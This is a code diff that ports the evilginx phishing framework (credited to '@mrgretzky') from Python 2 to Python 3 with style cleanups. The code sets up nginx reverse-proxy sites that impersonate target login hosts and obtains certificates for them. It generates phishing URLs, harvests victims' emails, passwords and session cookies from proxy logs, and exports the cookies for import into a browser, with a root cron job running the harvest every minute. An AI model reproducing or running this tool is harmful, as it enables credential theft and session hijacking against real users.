@@ -19,12 +19,13 @@ import os
 import os.path
 import argparse
 import json
-import ConfigParser
-import urllib
+import configparser
+import urllib.request
+import urllib.parse
+import urllib.error
 import time
 import re
 import datetime
-import sys
 import subprocess
 import base64
 
@@ -32,17 +33,19 @@ VERSION = 'v.1.1.0'
 
 EOL = '\n'
 TAB = '\t'
+CRONLOC = '/etc/crontab'
 DN = open(os.devnull, 'w')
 
 email_by_ips = {}
 passwd_by_ips = {}
 
-GLOBAL_CFG = ConfigParser.ConfigParser()
+GLOBAL_CFG = configparser.ConfigParser()
 
 SITE_DOMAINS = {}
 SITE_CERTS = {}
 
 CUR_DIR = os.path.dirname(os.path.abspath(__file__))
+FLOC = os.path.join(CUR_DIR, __file__)
 SSL_CERT_PATH = '/etc/letsencrypt/live/'
 SITES_AVAILABLE_PATH = '/etc/nginx/sites-available/'
 SITES_ENABLED_PATH = '/etc/nginx/sites-enabled/'
@@ -75,28 +78,28 @@ def load_cfg():
 
 def save_cfg():
     cfg_file = os.path.join(CUR_DIR, CONFIG_FILE_NAME)
-    with open(cfg_file, 'w') as f:
+    with open(cfg_file, 'w') as opened_file:
         GLOBAL_CFG.set('config', 'site_domains', json.dumps(SITE_DOMAINS))
         GLOBAL_CFG.set('config', 'site_certs', json.dumps(SITE_CERTS))
-        GLOBAL_CFG.write(f)
+        GLOBAL_CFG.write(opened_file)
 
 def add_to_file_if_not_exists(path, needle, add_line):
-    with open(path, 'r+') as f:
-        for line in f:
+    with open(path, 'r+') as opened_file:
+        for line in opened_file:
             if needle in line:
                 break
         else:
-            f.write(add_line + EOL)
+            opened_file.write(add_line + EOL)
 
 def get_post_args(data):
     """returns post args as a dict"""
     ret = {}
     pargs = data.split('&')
     for parg in pargs:
-        p = parg.split('=')
-        if len(p) == 2:
-            name = p[0]
-            val = p[1]
+        post_arg = parg.split('=')
+        if len(post_arg) == 2:
+            name = post_arg[0]
+            val = post_arg[1]
             ret[name] = val
     return ret
 
@@ -104,12 +107,12 @@ def get_set_cookies(data):
     """returns set-cookies headers as a dict"""
     ret = {}
     cargs = data.split('||')
-    for ck in cargs:
-        ie = ck.find('=')
-        sn = ck.find(';')
+    for cookie in cargs:
+        ie = cookie.find('=')
+        sn = cookie.find(';')
         if ie > -1 and sn > -1:
-            name = ck[:ie]
-            val = ck[ie+1:sn]
+            name = cookie[:ie]
+            val = cookie[ie+1:sn]
             ret[name] = unesc_data(val)
     return ret
 
@@ -117,89 +120,99 @@ def get_token_names(tokens_json):
     """gets token names from credentials config"""
     ret = []
     tokens = json.loads(tokens_json)
-    for tk in tokens:
-        for ck in tk["cookies"]:
-            ret.append(ck)
+    for token in tokens:
+        for cookie in token["cookies"]:
+            ret.append(cookie)
     return ret
 
 def get_token_domains(tokens_json):
     """gets tokens by domain"""
     ret = {}
     tokens = json.loads(tokens_json)
-    for tk in tokens:
-        for ck in tk["cookies"]:
-            ret[ck] = tk["domain"]
+    for token in tokens:
+        for cookie in token["cookies"]:
+            ret[cookie] = token["domain"]
     return ret
 
 def tokens_ready(setcookies, tokens):
     """check if all required tokens are present in set-cookies headers"""
-    if setcookies == None or tokens == None:
+    if setcookies is None or tokens is None:
         return False
     _tokens = tokens[:]
-    for tk in setcookies:
-        if tk in _tokens:
-            _tokens.remove(tk)
-    if len(_tokens) == 0:
+    for token in setcookies:
+        if token in _tokens:
+            _tokens.remove(token)
+    if not _tokens:
         return True
     return False
 
 def dump_tokens(setcookies, tokens, token_domains):
     """dumps crednetial tokens to string compatible with EditThisCookie chrome extension"""
     ret = []
-    for tk in tokens:
-        name = tk
-        val = setcookies[tk]
-        domain = token_domains[tk]
+    for token in tokens:
+        name = token
+        val = setcookies[token]
+        domain = token_domains[token]
         expire_time = int(time.time() + 2 * 365 * 24 * 60 * 60) # 2 years into the future
-        ck = {}
-        ck['domain'] = domain
-        ck["expirationDate"] = expire_time
-        ck['name'] = name
-        ck['path'] = '/'
-        ck['value'] = val
-        ret.append(ck)
+        cookie = {}
+        cookie['domain'] = domain
+        cookie["expirationDate"] = expire_time
+        cookie['name'] = name
+        cookie['path'] = '/'
+        cookie['value'] = val
+        ret.append(cookie)
     return json.dumps(ret)
 
 def create_log(outdir, logn, user_agent, email, passwd, tokens):
     """creates a log file"""
     if email == '':
         email = 'unknown'
-    
+
     if not os.path.exists(outdir):
         os.makedirs(outdir)
 
     log_dir = os.path.join(outdir, email)
     t_str = datetime.datetime.utcfromtimestamp(time.time()).today().strftime('%Y%m%d_%H%M%S')
-    
+
     if not os.path.exists(log_dir):
         os.mkdir(log_dir)
 
     # save creds
     if tokens != '':
-        with open(os.path.join(log_dir, t_str + '_' + str(logn) + '_tokens.txt'), 'wt') as f:
-            f.write('email:  ' + email + EOL)
-            f.write('passwd: ' + passwd + EOL)
-            f.write('user-agent: ' + user_agent + EOL + EOL)
-            f.write(tokens + EOL)
+        tokenfilename = os.path.join(log_dir, t_str + '_' + str(logn) + '_tokens.txt')
+        with open(tokenfilename, 'wt') as opened_file:
+            opened_file.write('email:  ' + email + EOL)
+            opened_file.write('passwd: ' + passwd + EOL)
+            opened_file.write('user-agent: ' + user_agent + EOL + EOL)
+            opened_file.write(tokens + EOL)
     elif passwd != '':
-        with open(os.path.join(log_dir, t_str + '_' + str(logn) + '_creds.txt'), 'wt') as f:
-            f.write('email:  ' + email + EOL)
-            f.write('passwd: ' + passwd + EOL)
-            f.write('user-agent: ' + user_agent + EOL)
+        credfilename = os.path.join(log_dir, t_str + '_' + str(logn) + '_creds.txt')
+        with open(credfilename, 'wt') as opened_file:
+            opened_file.write('email:  ' + email + EOL)
+            opened_file.write('passwd: ' + passwd + EOL)
+            opened_file.write('user-agent: ' + user_agent + EOL)
 
 def load_creds_cfg(path):
     """loads credentials config file"""
-    cfg = ConfigParser.ConfigParser()
+    cfg = configparser.ConfigParser()
     cfg.read(path)
 
-    if cfg.has_section('creds') and ((cfg.has_option('creds', 'email_arg') and cfg.has_option('creds', 'passwd_arg')) or (cfg.has_option('creds', 'email_arg_re') and cfg.has_option('creds', 'passwd_arg_re')) or (cfg.has_option('creds', 'email_json_arg') and cfg.has_option('creds', 'passwd_json_arg')))  and cfg.has_option('creds', 'tokens'):
+    key = 'creds'
+    arg_creds = cfg.has_option(key, 'email_arg') and cfg.has_option(key, 'passwd_arg')
+    json_creds = cfg.has_option(key, 'email_json_arg') and cfg.has_option(key, 'passwd_json_arg')
+    re_creds = cfg.has_option(key, 'email_arg_re') and cfg.has_option(key, 'passwd_arg_re')
+    cred_check = arg_creds or re_creds or json_creds
+    token_check = cfg.has_option(key, 'tokens')
+    if cfg.has_section(key) and cred_check and token_check:
         return cfg
     return None
 
 def fix_line(line):
-    return line.replace('\\x','%')
+    '''replaces \\x's '''
+    return line.replace('\\x', '%')
 
 def unesc_data(data):
+    '''unsecapes double quotes'''
     return data.replace('%22', '"')
 
 def parse_line(cfg, cur_email, line):
@@ -253,44 +266,43 @@ def parse_line(cfg, cur_email, line):
             set_cookies = get_set_cookies(req['set-cookies'])
             try:
                 post_json = json.loads(unesc_data(req['body']))
-            except:
+            except json.JSONDecodeError:
                 post_json = None
-            
+
 
             cur_email = ''
             cur_passwd = ''
             token_data = ''
 
             if email_arg != '' and email_arg in post_args:
-                cur_email = urllib.unquote(post_args[email_arg]).decode('utf8')
+                cur_email = urllib.parse.unquote(post_args[email_arg]).decode('utf8')
                 email_by_ips[req['remote_addr']] = cur_email
             if passwd_arg != '' and passwd_arg in post_args:
-                cur_passwd = urllib.unquote(post_args[passwd_arg]).decode('utf8')
+                cur_passwd = urllib.parse.unquote(post_args[passwd_arg]).decode('utf8')
                 passwd_by_ips[req['remote_addr']] = cur_passwd
             if email_arg_re_name != '' and email_arg_re_pattern != '' and email_arg_re_name in post_args:
-                post_arg = urllib.unquote(post_args[email_arg_re_name]).decode('utf8')
+                post_arg = urllib.parse.unquote(post_args[email_arg_re_name]).decode('utf8')
                 rxp = re.search(email_arg_re_pattern, post_arg)
                 if rxp:
                     cur_email = rxp.group(1)
                     email_by_ips[req['remote_addr']] = cur_email
-            if passwd_arg_re_name != '' and passwd_arg_re_pattern != '' and passwd_arg_re_name in post_args:
-                post_arg = urllib.unquote(post_args[passwd_arg_re_name]).decode('utf8')
+            if passwd_arg_re_name and passwd_arg_re_pattern  and passwd_arg_re_name in post_args:
+                post_arg = urllib.parse.unquote(post_args[passwd_arg_re_name]).decode('utf8')
                 rxp = re.search(passwd_arg_re_pattern, post_arg)
                 if rxp:
                     cur_passwd = rxp.group(1)
                     passwd_by_ips[req['remote_addr']] = cur_passwd
             if email_json_arg != '' and post_json != None and email_json_arg in post_json:
-                cur_email = urllib.unquote(post_json[email_json_arg]).decode('utf8')
+                cur_email = urllib.parse.unquote(post_json[email_json_arg]).decode('utf8')
                 email_by_ips[req['remote_addr']] = cur_email
             if passwd_json_arg != '' and post_json != None and passwd_json_arg in post_json:
-                cur_passwd = urllib.unquote(post_json[passwd_json_arg]).decode('utf8')
-                passwd_by_ips[req['remote_addr']] = cur_passwd        
+                cur_passwd = urllib.parse.unquote(post_json[passwd_json_arg]).decode('utf8')
+                passwd_by_ips[req['remote_addr']] = cur_passwd
 
             if tokens_ready(set_cookies, tokens):
                 token_data = dump_tokens(set_cookies, tokens, token_domains)
-        except:
-            print '[-] exception:', line
-            pass
+        except Exception:
+            print(('[-] exception:', line))
 
     return remote_addr, user_agent, cur_email, cur_passwd, token_data
 
@@ -324,7 +336,7 @@ def config_site(cfg, cfg_path, domain, do_enable, crt_path, key_path):
                         phish_hostname_esc += '%'
                     phish_hostname_esc += c
                 phish_hostnames_esc.append(phish_hostname_esc)
-        if len(phish_hostnames) == 0:
+        if not phish_hostnames:
             phish_hostnames.append(domain)
             phish_hostname_esc = ''
             for c in domain:
@@ -338,8 +350,8 @@ def config_site(cfg, cfg_path, domain, do_enable, crt_path, key_path):
 
         for site_conf in site_confs:
             conf_path = os.path.join(cfg_dir, site_conf)
-            with open(conf_path, 'rb') as f:
-                conf = f.read()
+            with open(conf_path, 'rb') as opened_file:
+                conf = opened_file.read()
 
             crt_path_file = crt_path
             key_path_file = key_path
@@ -358,20 +370,27 @@ def config_site(cfg, cfg_path, domain, do_enable, crt_path, key_path):
             conf = conf.replace('{{REDIR_ARG}}', cfg.get('site', 'redir_arg'))
             conf = conf.replace('{{SUCCESS_ARG}}', cfg.get('site', 'success_arg'))
             conf = conf.replace('{{LOG_NAME}}', cfg.get('site', 'log_name'))
-            
+
             for idx, phish_hostname in enumerate(phish_hostnames):
-                conf = conf.replace('{{PHISH_HOSTNAME[' + str(idx) + ']}}', phish_hostnames[idx])
-                conf = conf.replace('{{PHISH_HOSTNAME_ESC[' + str(idx) + ']}}', phish_hostnames_esc[idx])
+                conf = conf.replace(
+                    '{{PHISH_HOSTNAME[' + str(idx) + ']}}',
+                    phish_hostname)
+                conf = conf.replace(
+                    '{{PHISH_HOSTNAME_ESC[' + str(idx) + ']}}',
+                    phish_hostnames_esc[idx])
             for idx, target_host in enumerate(target_hosts):
                 conf = conf.replace('{{TARGET_HOST[' + str(idx) + ']}}', target_host)
             for idx, cookie_host in enumerate(cookie_hosts):
                 conf = conf.replace('{{COOKIE_HOST[' + str(idx) + ']}}', cookie_host)
 
-            with open(os.path.join(SITES_AVAILABLE_PATH, site_conf), 'wb') as f:
-                f.write(conf)
+            with open(os.path.join(SITES_AVAILABLE_PATH, site_conf), 'wb') as opened_file:
+                opened_file.write(conf)
 
             if not os.path.exists(os.path.join(SITES_ENABLED_PATH, site_conf)):
-                os.symlink(os.path.join(SITES_AVAILABLE_PATH, site_conf), os.path.join(SITES_ENABLED_PATH, site_conf))
+                os.symlink(
+                    os.path.join(SITES_AVAILABLE_PATH, site_conf),
+                    os.path.join(SITES_ENABLED_PATH, site_conf)
+                    )
 
             SITE_DOMAINS[cfg.get('site', 'name')] = domain
             SITE_CERTS[cfg.get('site', 'name')] = {'crt': crt_path, 'key': key_path}
@@ -386,11 +405,11 @@ def config_site(cfg, cfg_path, domain, do_enable, crt_path, key_path):
 def list_sites():
     """gets apps config paths"""
     ret = {}
-    for root, dirs, files in os.walk(os.path.join(CUR_DIR, 'sites')):
-        for dir in dirs:
-            cfg_path = os.path.join(root, dir, 'config')
+    for root, dirs, _ in os.walk(os.path.join(CUR_DIR, 'sites')):
+        for directory in dirs:
+            cfg_path = os.path.join(root, directory, 'config')
             if os.path.exists(cfg_path):
-                cfg = ConfigParser.ConfigParser()
+                cfg = configparser.ConfigParser()
                 cfg.read(cfg_path)
                 if cfg.has_section('site') and cfg.has_option('site', 'name'):
                     name = cfg.get('site', 'name')
@@ -399,11 +418,11 @@ def list_sites():
 
 def get_site_config(site_name):
     """get app config"""
-    for root, dirs, files in os.walk(os.path.join(CUR_DIR, 'sites')):
-        for dir in dirs:
-            cfg_path = os.path.join(root, dir, 'config')
+    for root, dirs, _ in os.walk(os.path.join(CUR_DIR, 'sites')):
+        for directory in dirs:
+            cfg_path = os.path.join(root, directory, 'config')
             if os.path.exists(cfg_path):
-                cfg = ConfigParser.ConfigParser()
+                cfg = configparser.ConfigParser()
                 cfg.read(cfg_path)
                 if cfg.has_section('site') and cfg.has_option('site', 'name'):
                     if site_name == cfg.get('site', 'name'):
@@ -413,7 +432,7 @@ def get_site_config(site_name):
 def site_exists(site_name):
     """checks if app exists"""
     apps = list_sites()
-    for name, path in apps.iteritems():
+    for name, _ in apps.items():
         if site_name == name:
             return True
     return False
@@ -442,15 +461,15 @@ def parse_args(show_help=False):
 
 def banner():
     """shows banner"""
-    print '            _ _       _            '
-    print '           (_) |     (_)           '
-    print '  _____   ___| | __ _ _ _ __ __  __'
-    print ' / _ \\ \\ / / | |/ _` | | \'_ \\\\ \\/ /'
-    print '|  __/\\ V /| | | (_| | | | | |>  < '
-    print ' \\___| \\_/ |_|_|\\__, |_|_| |_/_/\\_\\'
-    print '                 __/ |             '
-    print ' by @mrgretzky  |___/       ' + VERSION
-    print ''
+    print('            _ _       _            ')
+    print('           (_) |     (_)           ')
+    print('  _____   ___| | __ _ _ _ __ __  __')
+    print(' / _ \\ \\ / / | |/ _` | | \'_ \\\\ \\/ /')
+    print('|  __/\\ V /| | | (_| | | | | |>  < ')
+    print(' \\___| \\_/ |_|_|\\__, |_|_| |_/_/\\_\\')
+    print('                 __/ |             ')
+    print(' by @mrgretzky  |___/       ' + VERSION)
+    print('')
 
 def parser_main(args):
     """parser main function"""
@@ -458,7 +477,7 @@ def parser_main(args):
     cfg_paths = []
     if args.site == 'all':
         all_sites = list_sites()
-        for name, cfg_path in all_sites.iteritems():
+        for name, cfg_path in all_sites.items():
             cfg, cfg_path = get_site_config(name)
             if cfg:
                 cfgs.append(cfg)
@@ -469,20 +488,21 @@ def parser_main(args):
             cfgs.append(cfg)
             cfg_paths.append(cfg_path)
     else:
-        print "[-] Site '" + args.site + "' not found."
+        print("[-] Site '" + args.site + "' not found.")
         return
 
     last_passwd = ''
 
-    for i in range(0,len(cfgs)):
+    for i in range(0, len(cfgs)):
         cfg = cfgs[i]
         cfg_path = cfg_paths[i]
 
         site_name = cfg.get('site', 'name')
         out_dir = os.path.join(LOGS_DIR, site_name)
         log_path = os.path.join(VAR_LOGS, cfg.get('site', 'log_name'))
-        if i>0: print ''
-        print "Parsing logs for site '" + site_name + "'..."
+        if i > 0:
+            print('')
+        print("Parsing logs for site '" + site_name + "'...")
 
         creds_path = os.path.join(os.path.dirname(cfg_path), cfg.get('site', 'creds_conf'))
         if os.path.exists(creds_path):
@@ -496,10 +516,10 @@ def parser_main(args):
                 ncreds = 0
                 ntokens = 0
                 if os.path.exists(log_path):
-                    with open(log_path, 'r+b') as f:
-                        lines = f.readlines()
+                    with open(log_path, 'r+b') as opened_file:
+                        lines = opened_file.readlines()
                         for line in lines:
-                            if len(line) > 0:
+                            if line:
                                 remote_addr, user_agent, email, passwd, tokens = parse_line(creds_cfg, cur_email, line)
                                 if remote_addr != '':
                                     if remote_addr in email_by_ips:
@@ -516,8 +536,10 @@ def parser_main(args):
                                             do_log = True
                                     if tokens != '':
                                         # we got the token so purge cache
-                                        if remote_addr in email_by_ips: del email_by_ips[remote_addr]
-                                        if remote_addr in passwd_by_ips: del passwd_by_ips[remote_addr]
+                                        if remote_addr in email_by_ips:
+                                            del email_by_ips[remote_addr]
+                                        if remote_addr in passwd_by_ips:
+                                            del passwd_by_ips[remote_addr]
                                         last_passwd = ''
                                         ntokens += 1
                                         do_log = True
@@ -526,22 +548,22 @@ def parser_main(args):
                                         create_log(out_dir, logn, user_agent, email, passwd, tokens)
                                         logn += 1
                         if not args.debug:
-                            f.truncate(0)
-                            f.seek(0)
-                            for d_ip, d_email in email_by_ips.iteritems():
-                                f.write('> email_ip ' + d_ip + ' ' + d_email + EOL)
+                            opened_file.truncate(0)
+                            opened_file.seek(0)
+                            for d_ip, d_email in email_by_ips.items():
+                                opened_file.write('> email_ip ' + d_ip + ' ' + d_email + EOL)
                         else:
-                            print '[*] Debug mode on. Log was not truncated!'
+                            print('[*] Debug mode on. Log was not truncated!')
                 else:
-                    print "[-] Log file '" + log_path + "' not found."
+                    print("[-] Log file '" + log_path + "' not found.")
 
-                print '[+] Found creds:  ' + str(ncreds)
-                print '[+] Found tokens: ' + str(ntokens)
+                print('[+] Found creds:  ' + str(ncreds))
+                print('[+] Found tokens: ' + str(ntokens))
 
             else:
-                print '[-] Creds config corrupted.'
+                print('[-] Creds config corrupted.')
         else:
-            print '[-] Creds file "' + creds_path + '" not found.'
+            print('[-] Creds file "' + creds_path + '" not found.')
 
 def setup_main(args):
     """setup main function"""
@@ -563,100 +585,108 @@ def setup_main(args):
                 domain = args.domain.lower()
 
             if domain == '':
-                print '[-] Domain argument needed.'
-                print ''
+                print('[-] Domain argument needed.')
+                print('')
                 return
 
             crt_path, key_path = get_site_certs(site_name)
             if args.crt != '' and args.key != '':
-                if os.path.exists(os.path.abspath(args.crt)) and os.path.exists(os.path.abspath(args.key)):
+                crt_exists = os.path.exists(os.path.abspath(args.crt))
+                key_exists = os.path.exists(os.path.abspath(args.key))
+                if crt_exists and key_exists:
                     crt_path = os.path.abspath(args.crt)
                     key_path = os.path.abspath(args.key)
                 else:
                     if not os.path.exists(args.crt):
-                        print '[-] \'' + args.crt + '\' certificate file was not found.'
+                        print('[-] \'' + args.crt + '\' certificate file was not found.')
                     if not os.path.exists(args.key):
-                        print '[-] \'' + args.key + '\' certificate file was not found.'
-                    print ''
+                        print('[-] \'' + args.key + '\' certificate file was not found.')
+                    print('')
                     return
             elif (args.crt != '' and args.key == '') or (args.crt == '' and args.key != ''):
-                print '[-] Both --crt and --key arguments must be specified.'
-                print ''
+                print('[-] Both --crt and --key arguments must be specified.')
+                print('')
                 return
-            
+
             if args.use_letsencrypt:
                 crt_path = ''
                 key_path = ''
 
             do_enable = True
-            
+
         cfg, cfg_path = get_site_config(site_name)
         if cfg:
-            print "[*] Using domain: " + domain
+            print("[*] Using domain: " + domain)
             if crt_path != '':
-                print "[*] Using SSL/TLS public certificate file: " + crt_path
+                print("[*] Using SSL/TLS public certificate file: " + crt_path)
             if key_path != '':
-                print "[*] Using SSL/TLS private key file: " + key_path
-            print "[*] Stopping nginx daemon..."
+                print("[*] Using SSL/TLS private key file: " + key_path)
+            print("[*] Stopping nginx daemon...")
             subprocess.call(['service', 'nginx', 'stop'], stdout=DN, stderr=DN)
             config_site(cfg, cfg_path, domain, do_enable, crt_path, key_path)
             if do_enable:
-                print "[+] Site '" + site_name + "' enabled."
-                
-                if not args.auto_yes: auto_parse = raw_input('[?] Do you want to automatically parse all logs every minute? [y/N] ')
+                print("[+] Site '" + site_name + "' enabled.")
+
+                if not args.auto_yes:
+                    ques = '[?] Do you want to automatically parse all logs every minute? [y/N] '
+                    auto_parse = input(ques)
                 if args.auto_yes or auto_parse.upper() == 'Y':
-                    print '[+] Logs will be parsed every minute via /etc/crontab.'
-                    add_to_file_if_not_exists('/etc/crontab', os.path.join(CUR_DIR, __file__), '*/1 *   * * *   root    python ' + os.path.join(CUR_DIR, __file__) + ' parse -s all')
+                    print('[+] Logs will be parsed every minute via /etc/crontab.')
+                    add_to_file_if_not_exists(CRONLOC, FLOC, '*/1 *   * * * root    python ' + FLOC + ' parse -s all')
 
                 if crt_path == '' and key_path == '':
-                    if not args.auto_yes: get_ssl = raw_input("[?] Do you want to install LetsEncrypt SSL/TLS certificates now? [Y/n] ")
+                    if not args.auto_yes:
+                        ques = '[?] Do you want to install LetsEncrypt SSL/TLS certificates now? [Y/n] '
+                        get_ssl = input(ques)
                     if args.auto_yes or get_ssl.upper() != 'N':
                         cmd = [os.path.join(CUR_DIR, CERTBOT_BIN), 'certonly', '--standalone', '--register-unsafely-without-email', '--agree-tos', '-d', domain]
                         cert_subdomains = json.loads(cfg.get('site', 'cert_subdomains'))
-                        print "[*] Getting SSL/TLS certificates for following domains:"
-                        print " - " + domain
+                        print("[*] Getting SSL/TLS certificates for following domains:")
+                        print(" - " + domain)
                         for subd in cert_subdomains:
                             cmd.append('-d')
                             cmd.append(subd + '.' + domain)
-                            print " - " + subd + "." + domain
+                            print(" - " + subd + "." + domain)
                         if subprocess.call(cmd) == 0:
-                            print '[+] Certificates obtained successfully.'
+                            print('[+] Certificates obtained successfully.')
                         else:
-                            print '[-] Failed to obtain certificates.'
-                    if not args.auto_yes: renew_ssl = raw_input('[?] Do you want to auto-renew all obtained SSL/TLS certificates? [Y/n] ')
+                            print('[-] Failed to obtain certificates.')
+                    if not args.auto_yes:
+                        ques = '[?] Do you want to auto-renew all obtained SSL/TLS certificates? [Y/n] '
+                        renew_ssl = input(ques)
                     if args.auto_yes or renew_ssl.upper() != 'N':
-                        print '[+] Setting all SSL/TLS certificates to be auto-renewed via /etc/crontab.'
+                        print('[+] Setting all SSL/TLS certificates to be auto-renewed via /etc/crontab.')
                         add_to_file_if_not_exists('/etc/crontab', os.path.join(CUR_DIR, CERTBOT_BIN), '0  3    * * *   root    ' + os.path.join(CUR_DIR, CERTBOT_BIN) + ' renew') # run renew at 3:00am every day
             else:
-                print "[+] Site '" + site_name + "' disabled."
+                print("[+] Site '" + site_name + "' disabled.")
 
-            print "[*] Starting nginx daemon..."
+            print("[*] Starting nginx daemon...")
             subprocess.call(['service', 'nginx', 'start'], stdout=DN, stderr=DN)
         else:
-            print "[-] Site '" + site_name + "' not found."
+            print("[-] Site '" + site_name + "' not found.")
     elif args.list:
-        print 'Listing available supported sites:'
-        print ''
+        print('Listing available supported sites:')
+        print('')
         apps = list_sites()
-        for name, path in apps.iteritems():
-            cfg = ConfigParser.ConfigParser()
+        for name, path in apps.items():
+            cfg = configparser.ConfigParser()
             cfg.read(path)
             subdomains = []
             if cfg.get('site', 'cert_subdomains') != '':
                 subdomains = json.loads(cfg.get('site', 'cert_subdomains'))
-            print ' - ' + name + ' (' + path + ')'
-            if len(subdomains) > 0:
+            print(' - ' + name + ' (' + path + ')')
+            if subdomains:
                 sd_line = '   subdomains: '
                 for idx, subd in enumerate(subdomains):
                     if idx > 0:
                         sd_line += ', '
                     sd_line += subd
-                print sd_line
+                print(sd_line)
 
 def genurl_main(args):
     """generate phishing url"""
     site_name = args.site
-    cfg, cfg_path = get_site_config(site_name)
+    cfg, _ = get_site_config(site_name)
     if cfg:
         if site_name in SITE_DOMAINS:
             domain = SITE_DOMAINS[site_name]
@@ -667,20 +697,21 @@ def genurl_main(args):
                 phish_hostname = domain
 
             url = 'https://' + phish_hostname
-            print 'Generated following phishing URLs:'
-            print ''
+            print('Generated following phishing URLs:')
+            print('')
             for phish_path in json.loads(cfg.get('site', 'phish_paths')):
-                if phish_path[0] != '/': phish_path = '/' + phish_path
+                if phish_path[0] != '/':
+                    phish_path = '/' + phish_path
                 gen_url = url + phish_path
                 if args.redirect != '':
-                    b64redir = base64.urlsafe_b64encode(args.redirect).replace('=','')
-                    gen_url += '?' + cfg.get('site','redir_arg') + '=0' + b64redir
-                print ' : ' + gen_url
+                    b64redir = base64.urlsafe_b64encode(args.redirect).replace('=', '')
+                    gen_url += '?' + cfg.get('site', 'redir_arg') + '=0' + b64redir
+                print(' : ' + gen_url)
 
         else:
-            print "[-] Site '" + site_name + "' is not enabled."
+            print("[-] Site '" + site_name + "' is not enabled.")
     else:
-        print "[-] Site '" + site_name + "' not found."
+        print("[-] Site '" + site_name + "' not found.")
 
 def main():
     """main function"""
@@ -695,7 +726,7 @@ def main():
         setup_main(args)
     elif args.mode == 'genurl':
         genurl_main(args)
-    print ''
+    print('')
 
 if __name__ == '__main__':
     main()
